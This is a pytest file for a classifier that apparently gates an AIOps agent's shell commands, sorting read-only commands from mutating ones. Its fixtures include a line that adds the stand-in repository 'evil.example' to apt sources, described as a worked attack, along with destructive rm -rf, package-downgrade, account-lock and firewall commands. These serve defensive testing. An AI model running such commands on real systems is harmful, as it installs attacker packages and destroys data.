"""Tests for the shell-command -> structured-action classifier.

Command strings here are shaped like real exec_shell() calls an AIOpsLab
agent would issue (per aiopslab/orchestrator/actions/base.py and the
attack pattern described in the abstract), not synthetic toy syntax.
"""

from __future__ import annotations

from witness_core import parse_shell_command, split_compound_command, classify_subcommand


# --- compound-command splitting ---

def test_split_respects_quoting_around_control_operators():
    cmd = 'curl "http://x/y?a=1&&b=2" && echo done'
    parts = split_compound_command(cmd)
    assert parts == ['curl "http://x/y?a=1&&b=2"', "echo done"]


def test_split_on_semicolon_and_pipe():
    parts = split_compound_command("kubectl get pods | grep Running; echo ok")
    assert parts == ["kubectl get pods", "grep Running", "echo ok"]


# --- read-only recognition ---

def test_kubectl_get_is_read_only():
    result = classify_subcommand("kubectl get services --all-namespaces")
    assert result.read_only is True
    assert result.action is None


def test_kubectl_logs_is_read_only():
    assert classify_subcommand("kubectl logs nginx-abc123 -n test-social-network").read_only is True


def test_plain_ls_is_read_only():
    assert classify_subcommand("ls -la /var/log").read_only is True


def test_curl_get_is_read_only():
    assert classify_subcommand("curl http://localhost:32000/api/v1/query").read_only is True


def test_curl_post_is_not_read_only():
    result = classify_subcommand("curl -X POST http://internal/admin/reset -d 'x=1'")
    assert result.read_only is False


def test_find_delete_is_not_read_only():
    result = classify_subcommand("find /tmp -name '*.log' -delete")
    assert result.read_only is False


def test_echo_redirect_to_etc_is_not_read_only():
    result = classify_subcommand('echo "evil" >> /etc/hosts')
    assert result.read_only is False


def test_echo_redirect_to_scratch_dir_is_read_only():
    result = classify_subcommand("echo hello >> /tmp/scratch.txt")
    assert result.read_only is True


# --- the abstract's own worked attack, as a real exec_shell string ---

def test_add_apt_repository_is_classified_as_add_repo():
    result = classify_subcommand("sudo add-apt-repository -y ppa:ngx/latest")
    assert result.read_only is False
    assert result.action.verb == "add_repo"
    assert result.action.arguments["repository"] == "ppa:ngx/latest"


def test_sources_list_redirect_is_classified_as_add_repo():
    cmd = 'echo "deb http://evil.example/ ./" >> /etc/apt/sources.list.d/ngx.list'
    result = classify_subcommand(cmd)
    assert result.read_only is False
    assert result.action.verb == "add_repo"
    assert "evil.example" in result.action.arguments["repository"]


def test_full_attack_command_splits_into_add_repo_then_install():
    cmd = "sudo add-apt-repository -y ppa:ngx/latest && sudo apt-get install nginx"
    classified = parse_shell_command(cmd)
    assert [c.action.verb for c in classified] == ["add_repo", "install_package"]
    assert classified[0].action.arguments["repository"] == "ppa:ngx/latest"


# --- package install / downgrade ---

def test_apt_install_is_install_package():
    result = classify_subcommand("sudo apt-get install -y curl")
    assert result.action.verb == "install_package"
    assert "curl" in result.action.arguments["packages"]


def test_pinned_version_with_allow_downgrades_is_downgrade_package():
    result = classify_subcommand("sudo apt-get install --allow-downgrades mysql-server=5.5.62-0ubuntu1")
    assert result.action.verb == "downgrade_package"
    assert "mysql-server=5.5.62-0ubuntu1" in result.action.arguments["packages"]


def test_pip_install_is_classified():
    result = classify_subcommand("pip install requests==2.0.0")
    assert result.action.verb in ("install_package", "downgrade_package")
    assert "requests==2.0.0" in result.action.arguments["packages"]


# --- Kubernetes mutations ---

def test_kubectl_patch_is_k8s_patch():
    cmd = "kubectl patch deployment nginx -n default -p '{\"spec\":{\"replicas\":0}}'"
    result = classify_subcommand(cmd)
    assert result.action.verb == "k8s_patch"
    assert result.action.target == "deployment"


def test_kubectl_scale_is_k8s_scale():
    result = classify_subcommand("kubectl scale deployment/nginx --replicas=0 -n default")
    assert result.action.verb == "k8s_scale"


def test_kubectl_delete_is_k8s_delete():
    result = classify_subcommand("kubectl delete pod nginx-abc123 -n default")
    assert result.action.verb == "k8s_delete"


# --- service restart ---

def test_systemctl_restart_extracts_service_name():
    result = classify_subcommand("sudo systemctl restart nginx")
    assert result.action.verb == "restart_service"
    assert result.action.arguments["service"] == "nginx"


def test_service_command_restart_form():
    result = classify_subcommand("service nginx restart")
    assert result.action.verb == "restart_service"
    assert result.action.arguments["service"] == "nginx"


# --- TLS config edits ---

def test_sed_on_nginx_ssl_config_is_modify_tls_config():
    cmd = "sed -i 's/ssl_protocols TLSv1.2/ssl_protocols TLSv1.3/' /etc/nginx/nginx.conf"
    result = classify_subcommand(cmd)
    assert result.action.verb == "modify_tls_config"


# --- firewall / identity ---

def test_iptables_is_firewall_change():
    result = classify_subcommand("sudo iptables -A INPUT -p tcp --dport 22 -j DROP")
    assert result.action.verb == "firewall_change"


def test_usermod_lock_is_disable_account():
    result = classify_subcommand("sudo usermod -L alice")
    assert result.action.verb == "disable_account"
    assert result.action.arguments["username"] == "alice"


def test_passwd_lock_is_disable_account():
    result = classify_subcommand("sudo passwd -l alice")
    assert result.action.verb == "disable_account"
    assert result.action.arguments["username"] == "alice"


# --- fail-safe defaults ---

def test_unrecognized_mutating_command_falls_back_to_generic_shell_mutation():
    result = classify_subcommand("rm -rf /var/lib/some-service/data")
    assert result.read_only is False
    assert result.action.verb == "shell_mutation"
    assert result.action.arguments["command"] == "rm -rf /var/lib/some-service/data"


def test_completely_novel_command_defaults_to_gated_not_admitted():
    """A command matching neither a read-only pattern nor a known mutation
    hint must still be gated (fail closed), never silently classified as
    safe-to-skip."""
    result = classify_subcommand("some_custom_binary --do-the-dangerous-thing")
    assert result.read_only is False
    assert result.action.verb == "shell_mutation"


# --- plain-Docker mutations (AIOpsLab's own "docker" deployment mode) ---

def test_docker_restart_is_restart_service():
    result = classify_subcommand("docker restart hotel-rate")
    assert result.read_only is False
    assert result.action.verb == "restart_service"
    assert result.action.arguments["container"] == "hotel-rate"


def test_docker_stop_is_stop_service():
    result = classify_subcommand("docker stop hotel-rate")
    assert result.action.verb == "stop_service"
    assert result.action.target == "hotel-rate"


def test_docker_exec_captures_container_and_command():
    result = classify_subcommand("docker exec hotel-rate sh -c 'echo hi'")
    assert result.action.verb == "container_exec"
    assert result.action.arguments["container"] == "hotel-rate"


def test_docker_ps_and_logs_and_stats_are_read_only():
    assert classify_subcommand("docker ps -a").read_only is True
    assert classify_subcommand("docker logs hotel-rate --tail 50").read_only is True
    assert classify_subcommand("docker stats --no-stream").read_only is True
